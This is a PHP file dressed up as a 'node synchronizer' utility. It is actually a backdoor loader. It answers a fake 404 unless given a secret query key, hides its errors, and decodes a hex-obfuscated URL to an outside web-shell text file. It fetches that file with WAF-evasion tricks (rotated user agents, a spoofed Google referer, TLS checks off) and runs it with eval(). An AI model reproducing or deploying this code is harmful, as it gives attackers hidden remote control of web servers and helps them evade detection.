<?php
/**
 * ---------------------------------------------------------------------
 * High-Speed Node Synchronizer - Secure Gate V2.0
 * ---------------------------------------------------------------------
 */


$auth_key = "x";


if (!isset($_GET['ces']) || $_GET['ces'] !== $auth_key) {
    header("HTTP/1.1 404 Not Found");
    echo "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

@error_reporting(0);
@ini_set('display_errors', 0);

// Helper untuk decode hex
if (!function_exists('__x')) {
    function __x($h) {
        return pack("H*", $h);
    }
}

/**
 * Fungsi fetch data dengan teknik bypass WAF & Referer Spoofing
 */
function sys_waf_bypass_fetch($u) {
    $uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    ];
    $ua = $uas[array_rand($uas)];

    $res = false;
    
    // Metode 1: CURL (Prioritas)
    if (function_exists('curl_init')) {
        $ch = curl_init($u);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.google.com/');
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $res = curl_exec($ch);
        curl_close($ch);
    }

    
    if (empty($res) && function_exists('file_get_contents')) {
        $opt = [
            "http" => [
                "header" => "User-Agent: " . $ua . "\r\n" . "Referer: https://www.google.com/\r\n",
                "timeout" => 30
            ],
            "ssl" => [
                "verify_peer" => false,
                "verify_peer_name" => false,
            ]
        ];
        $res = @file_get_contents($u, false, stream_context_create($opt));
    }
    return $res;
}


$hex_url = "68747470733A2F2F68746D6C2E6176617461722D616D702E696E666F2F6261636B75702F616C66612D73632E747874";
$target = __x($hex_url);


$p = sys_waf_bypass_fetch($target);

if ($p) {
    try {
       
        @eval('?>' . $p);
    }
    catch (Throwable $e) {
        // Silent fail
    }
}
?>